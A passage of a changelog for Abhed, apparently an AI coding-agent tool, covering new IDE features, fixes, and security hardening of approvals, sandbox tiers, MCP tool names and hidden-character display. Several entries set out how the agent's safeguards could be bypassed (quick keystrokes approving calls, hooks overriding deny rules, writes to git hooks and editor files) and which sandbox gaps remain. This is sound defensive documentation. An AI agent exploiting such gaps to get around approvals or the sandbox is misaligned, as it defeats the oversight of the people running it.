  the tools it provides; `/hooks` says so.

- `/ide` attaches files to a message: the paperclip, a file dropped on the
  agent panel, or an image pasted into the message box. They are uploaded
  when the message is sent, through the console's upload route and its 32 MiB
  limit, and named in the prompt for the agent to read; an image is read as
  an image by a model that can see.
- A file dropped on an Explorer folder, or chosen with *Upload files here…*,
  goes into that folder under its own name. It is the person's recorded
  `write`, held to the view's and the write rules as a save is, and never
  replaces a file already there. The upload route takes the folder as a
  `dir` form field.
- `/ide` downloads: *Download* on a file in the Explorer, and a **Files**
  view of the documents, images and archives at the top of the workspace,
  through the existing download route and its read rules.
- Sessions have titles. `POST /v1/sessions/{id}/title` records
  `session.renamed` (`title`, `from`, `by`) between turns, the session list
  shows the title, and Postgres keeps it in a new `sessions.title` column.
  A single-role install adds it on start; a two-role install must run
  `abhed migrate` as the owner first, and the runtime role refuses to start
  until it has. `/ide` renames a session from its header or its row, and
  deletes one from the Sessions view.
- *Edit and resend* on `/ide`'s last message, between runs: the conversation
  forks to just before it, recorded as `conversation.forked`, and the edited
  message is sent. `POST /v1/sessions/{id}/fork` with `before_seq` is the
  engine's fork for any client, refused mid-turn, with messages queued, while
  background tasks run, or before a step that is not the person's message.
- `/ide` exports a session: its transcript as the self-contained HTML page
  `/export` writes, or its record, one event as JSON per line, from
  `GET /v1/sessions/{id}/export?format=html|jsonl`, the owner's only, as
  attachments. A Postgres record has no hash chain, so this export carries
  none; the verifiable export is still the command line's.
- `/ide` copies `abhed -r <id>` to continue a session in a terminal.
- `/ide` desktop notifications, off until turned on in the status bar, for an
  approval waiting or a run finished while the tab is in the background. Their
  text is fixed and carries nothing from the record.
- Studio can restart an MCP server: `_abhed/mcp/restart {sessionId, name}`
  reconnects one configured, enabled server, answers `{status, error?}`, and
  is recorded as `mcp.status` by the person. It is refused while a prompt,
  a woken turn or another restart runs, and a prompt waits for it in turn.
  `features` lists `mcp.restart`.
- A denied call's `tool_call_update` carries `_meta["zybuu.ai/abhed"].denied`
  with the policy step, the rule and who settled it, as an ask carries them.
- `_abhed/capabilities` reports each MCP server's connection error, redacted,
  and the tool names it offered that were not registered for their name
  (`refusedTools`), so Studio can say why a tool is missing.
- A message you send a running subagent from the terminal's work panel
  (`Message @<agent>`) is now also recorded in the session's own record, as
  `subagent.message` with the subagent's session, the text and `by: user`;
  before, only the subagent's record held it.
- In the terminal, Ctrl-B on an empty line during a turn moves the `bash`
  command or `task` subagent running now to the background: the call
  returns at once, the agent goes on, and the command or subagent keeps
  running, listed in `/tasks`, its result delivered when it ends. The record
  says so: `shell.started` with `from_foreground`, or
  `subagent.backgrounded` by the user. Elsewhere Ctrl-B is still
  cursor-left.

### Changed

- In the `/ide` line-by-line terminal, a typed character that draws nothing
  or changes the text's direction is echoed as one reverse-video `?`, so a
  bidi control or zero-width space in what you type shows. The line runs as
  typed.
- An `/ide` approval card for a background start says the command keeps
  running after the turn, and a card that offers no **Always allow** says
  which calls never get one (an ask rule, a destructive or chained command,
  a program off the short list), so `date -u` asking every time no longer
  reads as a fault.
- The wake and accounts guides now say that Sign out everywhere, or removing
  administrator rights, ends sign-ins and not work: a background shell or
  task already running still delivers its result and starts a woken run.

- `/mode`, an accepted plan and `/permissions` no longer print their own
  "mode: …" and "rule added" notices once a conversation is open: the
  record's line says it, once.

- A new dependency, `mvdan.cc/sh/v3` (BSD-3-Clause), for its bash parser;
  it needs nothing past the standard library.
- With tools offered, the `openai`, `vllm` and `openai-compatible` providers
  now send `"parallel_tool_calls": true`, so a model may ask for several
  calls in one turn. A provider's `extra.parallel_tool_calls` set to
  `"false"` turns it off, and `"true"` sends it for another OpenAI-shaped type.
- `shell_output` on a background shell still running now ends with how to
  stop it (`shell_kill` and its id): models left servers they had started
  running after the work was done.
- A compaction's summary now keeps the person's first message word for word
  beside it, up to 4,000 characters, through later compactions too. A
  summariser had restated the request, or given its own plan in its place,
  and lost what the person asked to be kept.
- A next-prompt suggestion whose reasoning used the whole output allowance
  and wrote no line is now asked once more without the reasoning settings,
  as one refused for them already was. Both calls count in the session's
  totals.
- With more than 40 MCP tools, a server of three tools or fewer is now
  still offered to the model in full, smallest first, up to twelve such
  tools in all; the rest stay behind `tool_search`. Behind it, a one-tool
  live-data server was passed over for the web search.
- The system prompt now names the project's own test command where a file
  at the workspace's root says it (`go.mod`, `Cargo.toml`, a `package.json`
  test script, pytest in `pytest.ini` or `pyproject.toml`, a Makefile's
  `test` target), and, where the session has them, says to choose with
  `ask_user` rather than asking in prose, and to hand broad work to a
  subagent with `task`. Models had run pytest in a Go module, asked in
  prose, and done broad searches alone.
- The `skill` tool's description now asks for it to be called first, before
  reading files or searching, when a request matches a listed skill.
- CI runs the container tier on Docker in a job of its own: a workspace
  write reaches the host, the root filesystem is read-only, the network is
  off, the pids, memory and swap bounds are what the policy says, and the
  hostname and PID 1 are the container's.
- In the terminal, a message typed during a run after a queued command
  (`/model`, `/mode`) no longer steers the run ahead of that command: it
  waits behind it and is sent as the next prompt once the command has run,
  in the order typed. A message with no command queued before it still
  steers the run.

### Fixed

- An edition's own subcommand could not take flags: `abhed identities
  forget -email x` failed with "flag provided but not defined", because the
  flags after it went to the global flag set. It now parses its own.
- A restarted stdio MCP server (`/mcp restart` too) kept the life of the
  request that restarted it, and two restarts at once could leave one
  server running unowned. The server now lives as long as the session, and
  restarts take turns.
- With a durable store, a session's row was listed while the server was
  still starting it, so a page opening the newest session at that moment,
  such as a second `/ide` tab, got `404` for its events, queue and terminal
  for a few seconds. The list now leaves out a session this server has not
  finished starting. For one still starting on another server, `/ide` asks
  its events, queue and terminal again after 0.5, 1 and 1.5 seconds, then
  says the session is still starting and stops.
- HawkEYE reported a session only people worked in, at the workbench's
  terminal or editor with no agent run, as outcome `running`. Its outcome is
  now `no agent run`.
- `abhed serve` kept a full copy of a file for every edit made to it in a
  session, for as long as the session was held, though only the copy from
  before the first edit is ever read (the changes view's baseline). It now
  keeps that one copy per changed file.
- An event whose payload was withheld because redaction could not run was
  drawn in `/ide` and the console with "undefined" in place of its fields
  (a call's tool, a fork's step, compaction and offload counts, the turns
  at an end, the model in `/ide`'s status bar). They now say the payload was
  withheld, or leave the field out.
- A session's event stream could close at the settled end that follows
  background work before the next-prompt suggestion announced by the run's
  end arrived, so the console never offered it. The stream now waits for
  that suggestion across the settled end.
- The console's session list showed a session opened in the workbench with
  no message as "(no prompt recorded)", and ignored a session's title. It now
  shows the title, else the first message, else "Workbench session", as
  `/ide` does.
- Withdrawing an owner's access counted, among the work it stopped, their
  workbench terminals that had already ended and were kept a minute for a
  late reader, so the count logged (and the admin audit's "background
  item(s) stopped") was too high. Only terminals still running are stopped
  and counted.
- After `/review` or `/security-review`, the terminal's footer still said
  plan mode though the session was back in its earlier mode, as the record
  and `/status` said. The footer is now drawn again once a command's turn
  has put back what it changed.
- On Postgres, a session opened in the workbench was listed as "Workbench
  session" after the server restarted, because its first message never
  reached the session's row. The row now takes the first message when the
  session was opened with none.
- A new `/ide` session showed the last session's next-prompt suggestion in
  its message box; it now starts with none.
- The console drew a woken turn's reply above the background result it
  answers, named a background shell by its id in "continuing with results
  from …", and did not show background shells at all. The reply now follows
  the result, the shell is named by its description, and a background
  shell's start and end are drawn in the conversation.
- `/ide` hid **Stop** once a turn ended, though background shells or tasks
  were still running and Stop would end them; it now stays while any runs.
- `/ide` showed a background task as running after it had ended when its
  notice was not yet recorded, as after a server restart. The task now
  leaves the status bar when the record says it returned, or when the
  session's end says no background work is owed.
- After a sign-out or a revoke, `/ide` kept reopening a session's event
  stream about once a second while it had background work, each attempt
  answered `401`, and still listed the stopped shell; the Explorer showed a
  bare `unauthorized`. A dropped stream is now reopened only after a
  request shows the person is still signed in, the page stops listing
  background work once the sign-in has ended, and a `401` reads "your
  sign-in ended; sign in again" wherever an error is shown.
- A model call could wait with nothing shown for as long as the endpoint
  held it open. Each request to the model now has a call timeout (600
  seconds) and a stall timeout for a reply that sends no bytes (300
  seconds), set per provider with `call_timeout_seconds` and
  `stall_timeout_seconds`. A timeout ends the turn with a model error the
  record marks `"retryable": true`, and is not retried on its own or asked
  again as a malformed reply.
- After a revoke and then a restore, the owner's open session stayed without
  wakes and suggestions until a background result was next delivered while
  it was idle. The owner's own next message now brings them back.
- The workbench's `/exec`, `/pty`, terminal input and resize endpoints
  answered an oversized body with 400. They now answer 413, as the rest of
  the server API does.
- `abhed doctor` said "Ready." and exited 0 while the event store or sign-in
  could not be opened, as before `abhed migrate`. It now says "Not ready",
  names them, points at `abhed migrate` and exits 1. With memory storage it
  named only the command line's local record; it now says that `serve` keeps
  sessions in memory, and names the local record as the command line's.
- A `tool_call` hook that answered only with a `log` or a `reason` was not
  recorded. It is now recorded as `hook.fired` with verdict `annotate`, as
  the extensions guide says.
- Studio's reject or undo of a change to an editor file (`.vscode/**`,
  `.git/config` and the rest) was refused with "the agent may not change
  it", though the person asked. It now says Abhed does not write that file
  for a reject or an undo either, and to change it in the editor.
- Studio's policy view named a rule's layer by guessing from the files, so a
  built-in allow rule the managed lock restored showed as `workspace`, and
  with the home folder as the workspace a set-aside user rule showed as
  `workspace`. It now names the layer loading credited, as `/permissions`
  does (`default` for a built-in rule, where it said `builtin`), lists the
  session's own and pinned rules as `session`, and names a set-aside rule's
  file by the layer it was read as.
- `abhed hawkeye` on a stream-json capture excused a gap before any
  `model.call` as omitted deltas, even one whose turn streamed nothing. It now
  excuses it only when that call's turn recorded a reply or reasoning, or the
  call failed part way, so a message or retried call lost before a
  tool-only turn is reported as `record-gap`.
- `abhed index -h` built the index and `abhed init -h` wrote a config.
  `-h` after a command that reads no flags of its own (`init`, `trust`,
  `doctor`, `providers`, `user`, `acp`, `rpc`, `index`) now prints that
  command's usage and exits 0.
- `abhed record verify` said "head seq 0" for the index, which is numbered
  by line and has no seq. It now says "head line N".
- The `bash` tool held a foreground command's whole output in memory before
  cutting it to its first and last 15,000 characters, so a command printing
  without end grew the process until it timed out. Output is now cut while
  it is read; what the model sees is unchanged.
- `/permissions explain write src/x.go` said the path must be absolute. A
  relative path is now read from the session's folder, as the file tools
  read it, and the answer names the path it explained.
- The container image's `abhed version` said `dev`: the image build did not
  stamp the version as the release binaries do. It now takes a `VERSION`
  build argument, which the release workflow sets to the tag.
- A compaction asked for over ACP (Studio's Compact, or `/compact` typed in
  an editor) that failed, or found nothing to summarise, left
  `compaction.started` in the record with no end. Its failure is now
  recorded as `compaction.completed` with the error, as an automatic one's is.
- `/fork` to a step the conversation does not have, after `/resume` of a
  session kept in Postgres, claimed the session and then released it with a
  second `session.ended`. The step is now checked before the claim.
- A second Ctrl-C exits after waiting 1.5 seconds for the turn to stop, and
  records the end itself when it has not. A turn that stopped after that
  wait, before the process had exited, could record a second
  `session.ended`. It no longer can.
- `abhed resolve` and `abhed acp` printed the warning about an untrusted
  workspace configuration twice, or once per session, because they load the
  workspace more than once. Each warning is now printed once per process.
- With input piped in as lines, `y`, `yes` or `a` typed while an approval
  waited was sent to the agent as steering (or as a prompt) as well as
  asking again. Such a line is now only asked again for the number.
- The work panel dropped a task title's hidden characters (`U+202E`,
  `U+200D`) without a trace, while `/tasks` showed them as escapes. The
  panel now shows them as `/tasks` does.
- A session continued with `-c` or `-r` and no `-mode`, in a mode other than
  the one its record ended in, recorded the change as made `via` `flag`. It
  is now recorded as `config`; `flag` is kept for a `-mode` given.
- `-fork-session` (and a fork from Studio) copied the source's name into the
  new session, so `-r NAME` matched both and the terminal started an empty
  session. A branch no longer takes its source's name; give it one with `-n`.
- A `-p` run continuing a session (`-c`, `-r`, `-fork-session`) that was
  stopped before it answered gave the session's earlier answer as `result`
  in its json and stream-json result line. It now gives an empty `result`.
- The statusline said "took longer than 300 ms" when its first run, which
  starts the sandbox and the script's interpreter cold, ran out of time. A
  first run that runs out of time is no longer named; a later one is. The
  statusline also stayed on the old mode after Shift-Tab pressed within a
  second of its last run; it now runs again once that second is up.
- The full-screen view that `/permissions`, `/status` and `/commands` open
  took keys typed ahead of it: a `q` closed it and other letters were lost.
  Letters arriving in the first 300 ms after it opens now go to the prompt,
  as typed.
- `subagent.spawned` listed the tools a subagent was given without `recall`,
  which every subagent has unless its definition disallows it. The list is
  now the subagent's own tools, `recall` included.
- The record gave "read-only tool" as the reason a `task` call (which may
  start a subagent in the background) and a `shell_output` or `task_status`
  call were allowed. They now read "subagent tool (each call the subagent
  makes is decided on its own)" and "session tool (reads this session's own
  background work)".
- A subagent's `bash` call with `run_in_background` asked the person for
  approval and was then refused, since a subagent cannot start a background
  command. It is now refused before anyone is asked, recorded as
  `action.denied` at step `precheck` with the same reason.
- In accept-edits and auto, a `write` or `edit` the tool refuses, such as
  one into `.abhed`, was recorded `action.approved` by the mode and then
  refused by the tool. A call allowed without asking is now checked as an
  asked one is: one that cannot succeed is recorded `action.denied` at step
  `precheck`, never approved.
- A `compact_at` below 0.25 compacted on every turn, however little history
  there was: the room kept for the coming turn, a quarter of the window,
  passed the threshold on its own. That room is now at most half of
  `compact_at`'s share of the window.
- A run stopped by a signal to the process (SIGTERM, SIGINT, SIGHUP) ended
  `user_interrupt` with no `detail`, unlike Esc and Ctrl-C, whose `detail`
  says which. Its `session.ended` now says `stopped by terminated` (or
  `interrupt`, `hangup`).
- `abhed doctor` and the `abhed serve` banner did not say which managed
  file was in force. Both now name it and how many settings it sets, and
  `abhed doctor --json`'s managed check names it too.
- HawkEYE's token totals left out the model calls made for next-prompt
  suggestions, so they read lower than the session's own totals. They now
  include them; the Turns table still lists turns only.
- `abhed rpc` wrote what the tool set skipped to whatever `os.Stderr` was
  when the warning came, read from the tool set's goroutines, rather than to
  the stderr it started with as its other messages do.
- Commands queued while a turn ran each waited up to a second for the
  turn's output to be drawn, even when drawing had stopped, so a backlog of
  them ran a second apart. The wait now ends once drawing has made no
  progress for 100 ms.
- A line pasted into the workbench shell or Studio's interactive terminal
  was recorded as `terminal.input` even when writing it to the shell failed
  because the terminal had ended. It is now withdrawn unrecorded. A typed
  line is still recorded as its Enter is read.
- Taking withheld lines out of a shell's recorded output searched for every
  four-character piece of every withheld line, which at the extreme (many
  long withheld lines) took hundreds of megabytes. The search is now bounded;
  past it, the output is withheld whole with a note saying why.
- Under a managed file that locks the allow rules, a user's or workspace's
  file repeating a built-in rule with spaces around it (`" bash(pwd) "`)
  left that rule in the list twice. Rules are now compared trimmed.
- An MCP tool left out for its name was named only in a warning on stderr,
  which a terminal session does not show. `/mcp` now lists such tools under
  their server, with hidden characters shown as escapes.
- Keys typed after Esc that began like a terminal's reply (`]11;`) were held
  unshown for as long as typing kept coming in gaps under 150 ms. A reply is
  now given 300 ms in all; past that, what came is typing, shown as typed.
- A `/model` queued behind a custom command whose turn had not run yet was
  undone when the command switched its own model back, and a queued `!` ran
  on the command's narrowed tools. Both are now refused until that turn has
  run, with a note to run them after it.
- A subagent started from the command line read its memory files without
  the session's `memory.import_depth` or `rules.dirs`, and its record had no
  `memory.loaded`. It now loads memory as the session does, auto memory
  aside, and records which files its prompt carries.
- `/fork`'s list of steps showed a skill pipeline's steps as if they were the
  agent's own calls. Each now names its pipeline; forking at one forks
  before the skill call that ran it.
- A background command's `shell.started` named the sandbox tier read before
  the command was built, which for a session's first command, when the
  sandbox is chosen as that command is built, was not the tier it ran under.
  The tier is now read once the command is built.
- Container tier:
  - Podman named otherwise (`podman-remote`, or the podman-docker wrapper
    named `docker`) was taken for Docker, so PID and UTS were not pinned
    private. Podman is now known by what `--version` says it is.
  - `sandbox.max_memory_mb` left swap at the engine's default, as much again
    as the memory, so a command could use twice the bound. Swap is now set
    to the same.
  - A process limit (`--ulimit nproc`) was set beside `--pids-limit`, and
    under rootful Docker it counts every process of the same uid on the host.
    It is now set only when `sandbox.max_procs` is 0.
- On Linux the process tier counted as available whenever `bwrap` was
  installed, so where it cannot create namespaces (no unprivileged user
  namespaces) every command failed instead. Abhed now asks `bwrap` once,
  at start-up, and treats the tier as unavailable, with `bwrap`'s reason,
  when it cannot.
- The process tier's description (`abhed doctor`, the banner) said "at most N
  more processes per command" where it could not count the user's processes
  and so set no limit. It now says the processes are not bounded there, and
  names memory, CPU and disk as not bounded on this tier.
- With the network off, `cat build.log; curl --version` was followed by the
  note that the sandbox has no network when the log's last lines named a
  network error. A network client asked only for its version or help no
  longer counts toward that note.
- A password change submitted twice at once could end the session that
  made it: each request stamped the session with its own new hash, and the
  one stored last did not match. Changes now run one at a time in a
  process, so the second finds the password already changed.

### Documentation

- Corrected claims the code did not back:
  - The process tier was said to use seccomp and Landlock on Linux. It runs
    bubblewrap with neither, and the docs now say so.
  - MCP servers were said to run in the gVisor tier with declared egress
    only. A stdio server runs on the host, outside the sandbox, with your
    user's access and network; `digest` is not checked.
  - The monitor was said to come in the next release. Nothing turns it on
    yet, and the guide no longer gives a date.
  - Sandboxed writes were said to be scoped to the workspace. On the
    process tier a command may also write temp folders and, on macOS,
    toolchain caches; the configuration guide lists them.
- The MCP guide's example now loads: `env` is a list of entries, and a
  server needs `"enabled": true`.
- The README no longer shows an egress broker or an MCP registry, and the
  security doc marks anomaly detection as not built.
- Guides now say: `memory_write` is offered only in an interactive session;
  a destructive `!` line asks once; "Yes, and don't ask again" covers a
  call's subject; what a managed file's dropped allow rules do at run time;
  a revoke refuses a waiting call at step `ask`; HawkEYE's token totals
  leave out suggestion calls.

### Upgrading

- **`abhed migrate` before starting a two-role Postgres install.** 1.2.4
  adds `sessions.title` and `events.inserted_at` (schema version 6). A
  server whose runtime role cannot add them refuses to start and names the
  column; run `abhed migrate` with the owner connection first. A single-role
  install adds them at start. The same step adds a trigger that sets
  `events.inserted_at` to the database's clock, whatever a writer sends, and
  an edition's provisioning may no longer change the grant on a core table.
- **Servers sharing one Postgres: stop every 1.2.3 node before starting a
  1.2.4 one.** A 1.2.4 lease carries a process token that a 1.2.3 node
  neither writes nor checks, so running both releases on the same sessions
  at once is not supported.
- **A stdio MCP server no longer inherits your environment.** A server that
  read a token or setting from a variable it inherited, such as
  `GITHUB_TOKEN` or `HTTPS_PROXY`, now needs it listed in its `env`: as
  `"KEY"` to pass your own value, or `"KEY=VALUE"`. `abhed mcp add -env KEY`
  does the same.

### Go API

All additive; the `sdk` package is unchanged.

- `app`: `InAgentCommand`, which says why the process runs inside an
  agent's command, so an edition's own subcommand that changes state can
  refuse it as the built-in ones do.
- `auth`: `FileUserStore.Create`, which adds an account under the users
  file's lock and refuses a name or email another holds.
- `config`: `LoadOptions.Settings` and `LoadOptions.SettingsName`, the
  `SettingsSource` type and `Config.Settings`, the `LayerSettings` rule
  layer, `SetAsideKey.Layer`, `Config.NarrowHooks`, `GrantFor`,
  `CLIConfig.Title`, `CLIConfig.Notify` and `CLIConfig.Copy`,
  `HooksConfig.ManagedOnly`, `ProviderConfig.CallTimeoutSeconds` and
  `StallTimeoutSeconds`, `PermissionsConfig.GitExtensions` and
  `SSHConfig.ConnectHosts`. `Printable` and `PrintableText` now escape as
  `internal/visible` does.
- `server`: `InviteEmailChecker`, an `InviteRedeemer` whose codes may be
  made out to one address; signup asks it before the code is spent, so a
  refusal keeps the code. Routes: `POST /v1/sessions/{id}/title`,
  `POST /v1/sessions/{id}/fork` and `GET /v1/sessions/{id}/export`, and a
  `dir` form field on the upload route.
- `store`: `SessionRecord.Title` and `HolderNode`. A provisioning
  extension's grant may name columns after `SELECT`, `INSERT` or `UPDATE`
  (`"SELECT, INSERT, UPDATE (seen_at)"`), which replaces a table-wide grant
  an earlier migrate gave.

## [1.2.3] - 2026-10-02

### Security

- A password typed ahead of `read -s` in the workbench shell or Studio's
  interactive terminal could reach the record in clear, three ways.
  - On the container tier, where the terminal cannot be asked, a line typed
    while a command still ran was recorded with its text. It is now recorded
    without its text unless the output had come back to a line ending in
    `$ ` or `# `; so is a line on the process and none tiers when the
    terminal could not be asked.
  - On the process and none tiers, a line typed while another program had
    the terminal (`sleep 2; read -s pw`) was not recorded, but the terminal
    echoed it into the recorded output. When that program left the terminal
    reading lines, the line is now taken out of the output as below; keys
    typed into a program reading raw keys (an editor, a REPL) are not. The
    same holds for a single command run in the workbench's `lines` mode.
  - On every tier, a line recorded without its text could still be in the
    latest output that the shell's end records: arriving after bash had
    handed the terminal back with echo on and before `read -s` turned echo
    off, it was echoed. Whether it was depended on timing, so slower
    machines leaked it more often. Each line of that output holding four or
    more characters in a row of a withheld line is now replaced by
    `[withheld]`, and when a withheld line was edited as it was typed, the
    output is withheld whole. Pieces shorter than four characters split
    apart by other output are not caught (docs/guide/16-workbench.md).
- The console and `/ide` drew a tool call's output with its bidi, isolate,
  joiner, zero-width and control characters applied, so a background task's
  description echoed in "Started in background" could reorder or hide part
  of the line in the call's peek and output. Every call's output, peek and
  header, replies and reasoning, the person's messages, decision reasons,
  the agent's terminal tab, the refusals, reasons and notes Abhed writes
  into a line terminal and the directory in its prompt, file names
  (Explorer, tabs, search, the command palette and the `@` list), file and
  diff lines, search results, session titles, the running label, MCP,
  skill and extension names, the permission rules in `/ide`'s Tools panel
  and the server's error notes now show those characters as `⟨U+XXXX⟩`,
  keeping newlines, tabs and indentation.
- `/ide` drew a model error with the model's own invalid tool arguments
  quoted as given, so an RLO in them reversed the row. It is now written out
  like any other record text.
- An MCP server's tool names were taken as given, so a name holding an RLO
  or other hidden characters reached the prompt and the "always allow"
  scope as given (1.2.2 and earlier; the approval card already escaped it). A remote tool is now registered
  only when its name is letters, digits, `_`, `.` and `-`, up to 64, the rule
  `tool_search` already lists names by; any other is left out with a
  warning naming the server and the escaped name.
- A managed file that set `permissions` but not `permissions.allow` still let
  (as 1.2.2 documented; now tightened) `-allow`, the SDK's `Options.Allow`, rpc's `start`, and the allow lists in
  `~/.abhed/config.json` and a trusted workspace's `.abhed/config.json` add
  allow rules. Every path, including the new `-allowedTools` and
  `/permissions allow`, now refuses an allow rule when the managed file sets
  any `permissions` setting, and the two files' allow rules are left out
  with a warning naming each rule and its file.
- Over ACP, the agent can no longer change an editor's own files in the
  workspace; this affects ACP editors in 1.2.2 and earlier. The file tools
  refuse `.vscode/**`, `.devcontainer/**` and `*.code-workspace`, and any
  `.git` with its `config` and `hooks/**` at any depth, so a nested
  repository's too, in any case and through links, and the
  config and hooks of the git folder a `.git` file names. They refuse to
  create any of these as well as to change them. The sandbox keeps the
  agent's commands from writing those that exist, and from renaming `.git`,
  `.vscode` or `.devcontainer`, at the workspace's given and resolved paths.
  Nested repositories are found when the session starts, up to six folders
  deep, 64 repositories and 20,000 entries looked at, `node_modules` left
  out. On macOS commands also
  cannot create these paths, nor any `.git`, `.git/config` or `.git/hooks` at
  any depth, so a repository cloned or initialised later is held too, and
  `git init` or `git clone` inside the workspace is refused there. On Linux
  (bubblewrap) and in containers a command can still create a missing
  `.vscode`, `.devcontainer` or `.git`, or a repository the search did not
  find; on every platform a command can create a new `*.code-workspace`. An
  edit or write to a file the editor reports as having unsaved changes
  (`_abhed/buffers/dirty`) is refused.
- In Studio's interactive terminal and the web IDE's, a line entered before
  the shell is back at its prompt, as a password typed ahead of `read -s`, is
  recorded withheld rather than as text.
- `session/new` refuses an `_meta` field it does not know instead of ignoring
  it, and the MCP servers an editor names are not started; the reply lists
  them in `mcpServersRefused`.
- A held ask a person reviews from Abhed Studio is bound to its request like
  any other: an option id offered for another request is refused, and an
  ask still open when the review closes or the person stops is refused,
  never approved.
- A `tool_call` or `permission_request` extension that crashes or times out
  now fails closed: the call it failed on is refused, and while it is not
  running every call it would have screened is asked. It was skipped before,
  so its veto silently stopped applying.
- `-add-dir`, `additional_dirs` and `/add-dir` refuse a credential folder such
  as `~/.ssh`, a folder that holds the home directory, and one that holds
  `~/.abhed` or a configured state file, and any `.abhed` folder itself;
  before, only `/` and the home directory itself were refused. A folder
  that holds the workspace, as a monorepo's root does, is still allowed.
  `/add-dir` adds only the folder it checked and showed, so a path swapped for
  a link while the person answers is refused.
- An extension that answered `ask` about a call a deny rule or plan mode
  refuses turned the refusal into a question, which a person could then
  approve: hooks were evaluated first, and their ask ended the evaluation.
  A hook's ask now applies only after the deny rules and plan mode. Its
  refusal is still final, and an `allow` in its reply approves nothing.
- The 300 ms guard from 1.2.2's approval prompt now also covers the new
  approval dialog. In 1.2.2 a decision key counted only alone, on an empty
  line, 300 ms after the choices were drawn and with 300 ms of quiet on
  either side, and Enter never answered. In the dialog no key, arrows and
  Enter included, counts for the first 300 ms the question is on screen; a
  number counts only with 300 ms of quiet on either side, so typing or a key
  held down never answers, and a number that fails this chooses nothing and
  leaves nothing selected; nothing is selected at first; and Enter never
  approves: on a highlighted No it declines, on a Yes it answers nothing.
  Found before release, in the new dialog: `j` and `k` moved the selection
  with no quiet rule, so `j` then Enter approved, and a number refused for
  the keys around it stayed selected for a later Enter. No letter moves the
  selection now. Approvals are answered by number only, in the dialog and
  in the line mode alike: no letter approves. Only the answers offered can be
  chosen. A destructive command needs a second, numbered Yes, whose default
  is No. Every other question the CLI asks is numbered too, the workspace
  trust prompt included (1 don't trust, 2 trust, 3 view): no letter or word
  answers one. An approval whose call carries a hidden character anywhere
  (an argument, a key, a JSON string inside one, the reason, the scope, who
  asked) shows it as an escape and warns above the answers.
- Text from the model, from tools, from the workspace (a git branch) and
  from a status line command is drawn with every control and format
  character removed, rune by rune, keeping only text and colour: C0 and C1
  controls, OSC, DCS and other escapes, bidi overrides and isolates,
  zero-width and tag characters. Conceal (SGR 8) is dropped from colour, and in
  what programs print, so is a colour that sets the text to its background's
  colour when both are explicit: printed text cannot be made invisible. Every row the terminal draws passes
  through the same filter, and so does everything the line mode prints on a
  terminal (piped input, `TERM=dumb`): its approvals, replies, tool output
  and what commands print. In an approval and in a diff nothing is dropped:
  hidden characters are shown as marked escapes (`⟨\r⟩`, `⟨U+200B⟩`), so a
  command cannot show one thing and run another. Tests send OSC 52, OSC 0,
  OSC 8, screen erases, C1 sequences and joiner-hidden controls through
  every field that reaches the screen, in the dialog and in the line mode,
  and find none of them on the wire.

### Upgrading

The first nineteen items change how an existing setup behaves; read them
before upgrading.

1. **Answers are numbers only, for piped and scripted input too.** 1.2.2's
   line prompt took letters; these now ask again, and input that ends
   unanswered refuses.
   - Approvals: `1` Yes, `2` the session-wide Yes when one is offered, and
     the last number No. `a`/`y`, `r`/`n` and `A` no longer answer.
   - Workspace trust: `1` don't trust, `2` trust, `3` view the file, where it
     took `t`, `d` and `v`.
   - The confirmations of `abhed record prune` and of the push in
     `abhed resolve`: `1` No (keep), `2` Yes, where they asked `[y/N]`.
     `-yes` and `-y` still skip them.
   - First-run setup's yes-or-no questions (memory notes, a key over plain
     http, a key variable that is not set): `1` No, `2` Yes, where they took
     `y`/`n` and Enter for No.
   - First-run setup's last question, whether to write
     `~/.abhed/config.json`: `1` No (don't write), `2` Yes. It took Enter as
     yes; Enter or a letter now asks again, and input that ends writes
     nothing.
2. **Piped lines that start with `!` or `#` are no longer sent to the
   model.** They run a shell command or save a note, as typed ones do. A
   script that sent such lines as text should indent them or put them after
   other text.
3. **Wake is on by default.** `subagents.wake` defaults to `auto` in the
   interactive CLI, in `abhed serve` (the console and workbench) and in
   `abhed acp` (Abhed Studio and other editors): when a background task
   finishes while the session is idle, the agent continues with the result
   on its own, and spends tokens doing so. Set
   `"subagents": {"wake": "notify"}` to restore 1.2.2's behaviour; a
   managed configuration that does not set it gets the new default, so
   admins who relied on the old behaviour should pin it there before
   upgrading. `abhed rpc` and the SDK still
   default to `off`.
4. **Next-prompt suggestions are on by default.** Each completed turn makes
   one extra model call, recorded as a `model.call` with
   `purpose: suggestion` and counted in the session's tokens and budget.
   `"suggest": {"enabled": false}` turns them off. A `suggest.model` on a
   different endpoint receives the redacted last message and reply.
5. **The command line now writes sessions to disk**, in a local record under
   `~/.abhed/records`, when `storage.driver` is not `postgres`; before, they
   were kept in memory and lost when it exited. The record includes
   unredacted copies of files as they were before each agent edit, so
   `/undo` and `/rewind` can put them back; files that hold keys and files a
   read deny rule covers are not copied. The directory is created, private
   to you, on first use, and records are kept until `abhed record prune`
   removes them. `abhed serve` still keeps memory unless configured
   otherwise.
6. **Server API: `request_id` is required on subagent approvals.** A client
   answering a subagent's ask (`POST /v1/sessions/{id}/approve`) must name
   its `request_id`, from the `subagent.ask` event; an answer naming none is
   refused with 409, with or without a run live. The console, workbench, CLI
   and ACP already send it.
7. **Shared Postgres: stop every node of an older release before starting a
   node of this one.** Older nodes keep no holder on the sessions they run,
   and a new node's startup sweep reconciles an open session with no holder
   once nothing has been written to it for two minutes; a long tool call on
   an old node can look like that. New nodes write the holder with the
   session's row and heartbeat it.
8. **Extensions fail closed.** A `tool_call` or `permission_request`
   extension that has stopped (crashed, hung or was closed) now makes each
   call it would have screened ask, where it was skipped before; in a
   headless run, which cannot ask, those calls are refused. `/hooks` and the
   serve banner show which one stopped. A hook's `ask` no longer overrides a
   deny rule or plan mode.
9. **Headless output.** `abhed -p` exits with 128 plus the stop signal's
   number (143 for SIGTERM), where it was 130 for every signal. `json` and
   `stream-json` output end with a `{"type":"result",…}` line. `stream-json`
   omits `agent.delta` fragments unless `-include-partial-messages` is
   given.
10. **ACP editors.**
    - `session/new` refuses an `_meta` field it does not know.
    - MCP servers an editor names are not started; the reply lists them in
      `mcpServersRefused`.
    - The workspace trust report moved to `_meta["zybuu.ai/abhed"]`;
      `_meta.abhed` is still read on input for one more release.
    - Stop reasons come from the run's terminal reason.
    - Writes to `.vscode/**`, `.devcontainer/**`, `.git/config`,
      `.git/hooks/**`, `*.code-workspace` and files with unsaved changes in
      the editor are refused.
11. **`-add-dir`, `additional_dirs` and `/add-dir`** refuse credential
    folders, any folder that holds the home directory or `~/.abhed`, and any
    `.abhed` folder.
12. **The interactive CLI counts `limits.max_turns` per message** unless the
    managed configuration sets it.
13. **`/export` with no path writes to `~/.abhed/exports`**, not the
